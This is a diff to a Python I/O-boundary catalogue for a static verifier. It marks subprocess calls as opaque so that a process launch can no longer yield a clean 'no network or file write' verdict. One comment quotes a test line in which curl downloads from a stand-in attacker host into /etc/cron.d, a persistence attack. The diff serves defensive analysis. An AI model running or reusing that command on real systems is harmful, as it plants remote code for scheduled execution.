@@ -121,6 +121,35 @@ _DISCLOSED_ONLY_BOUNDARIES: frozenset[str] = frozenset(
     {"external_potential", "command_launch"},
 )
 
+# Boundaries whose classification records that the analysis CANNOT SEE PAST the
+# call, rather than a known and complete I/O surface (INV-gahuz).
+#
+# THE DISTINCTION THIS DRAWS, and why it is a property of the vocabulary rather
+# than of any one consumer. Every other boundary names something the catalogue
+# KNOWS a primitive does: ``os.makedirs`` is an ``fs_write`` and that is the
+# whole of its I/O, so a call to it is an examined negative for a network claim.
+# A ``subprocess`` row asserts the opposite — that control leaves this process
+# for a program whose behaviour is not in the edge set at all. Both are correct
+# classifications; only one of them licenses "I looked and found nothing".
+#
+# WHY ``subprocess`` IS THE ONLY MEMBER, and this is a closed question rather
+# than an oversight. ``_parse_catalog`` iterates exactly
+# ``CATALOG_BOUNDARY_TYPES``, so a catalog can never declare anything outside
+# it; ``external_potential`` and ``command_launch`` are synthesised, never
+# declared, and already excluded from the verified surface by
+# ``_DISCLOSED_ONLY_BOUNDARIES`` above. ``subprocess`` is therefore the single
+# catalog-declarable boundary that means opacity. If a future boundary is added
+# to ``CATALOG_BOUNDARY_TYPES`` whose meaning is "control left this process",
+# it belongs here too, and the axis-conformance tests are what will ask.
+#
+# MEASURED CONSEQUENCE OF NOT HAVING THIS (the reason it exists): a six-line
+# program whose only statement is ``subprocess.run(["curl", "-o",
+# "/etc/cron.d/pwned", "https://evil.example/p"])`` returned ``confirmed`` rc 0
+# for BOTH a ``fs_write`` and a ``net_send`` ``must_not_exist`` claim, while
+# ``open(f, "w")`` and ``socket.send`` controls returned ``violated`` rc 1 in
+# the same session.
+OPAQUE_BOUNDARIES: frozenset[str] = frozenset({"subprocess"})
+
 
 # ---------------------------------------------------------------------------
 # Provenance allowlist (Plan C, PR B)
@@ -750,6 +779,39 @@ class IoBoundaryCatalog:
         another.
         """
         return bool(module) and module in self.stdlib_module_completeness
+
+    def declares_opaque_crossing(self, module: str, name: str) -> bool:
+        """Does ANY row for this primitive carry an opaque boundary (INV-gahuz)?
+
+        ASKED OVER EVERY ROW, NOT OVER THE ONE ``classify_call`` RETURNED, and
+        that distinction is the whole reason this method exists rather than a
+        ``primitive.boundary in OPAQUE_BOUNDARIES`` test at the call site.
+        ``lookup_with_module`` returns a SINGLE primitive, so a call catalogued
+        under two boundaries is reported under whichever row is found first —
+        and opacity can lose that race. Measured across all 14 shipped
+        catalogues, 2 primitives are masked exactly this way, both in Scala:
+
+            scala.sys.process.Process.apply  -> returned as fs_write
+            scala.sys.process.Process.run    -> returned as fs_write
+
+        Their own catalogue note says why the second row exists — *"Scala
+        process execution (can write to filesystem via shell commands)"* — so
+        the author correctly recorded that a launch may also write, and that
+        very row then hid the launch. A boundary-blind ``examined`` shortcut
+        reading only the first match would treat both as a known filesystem
+        surface and permit a clean network verdict over a process launch.
+
+        The rule is one-way on purpose: a primitive is opaque if ANY of its
+        rows says so. Opacity is a property of what the call DOES (control
+        leaves the process), and a second row naming an additional boundary
+        adds information about that same call rather than retracting it.
+        """
+        return any(
+            primitive.boundary in OPAQUE_BOUNDARIES
+            and primitive.module == module
+            and primitive.name == name
+            for primitive in self.primitives
+        )
 
     def merge(self, parent: IoBoundaryCatalog) -> IoBoundaryCatalog:
         """Merge a parent catalog into this one. Self's entries take precedence.
